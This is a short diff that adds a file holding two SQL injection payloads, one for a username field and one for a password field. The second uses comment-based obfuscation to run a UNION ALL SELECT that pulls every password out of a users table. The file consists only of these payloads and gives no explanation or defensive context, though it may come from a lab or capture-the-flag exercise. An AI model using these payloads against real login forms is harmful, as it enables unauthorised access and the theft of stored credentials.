@@ -1,0 +1,5 @@
+username : ' || (SELECT username FROM USERS group by id having id=1) -- -
+
+password : '/**/union/**/all/**/select+group_concat(password)/**/from/**/users/**/--
+
+
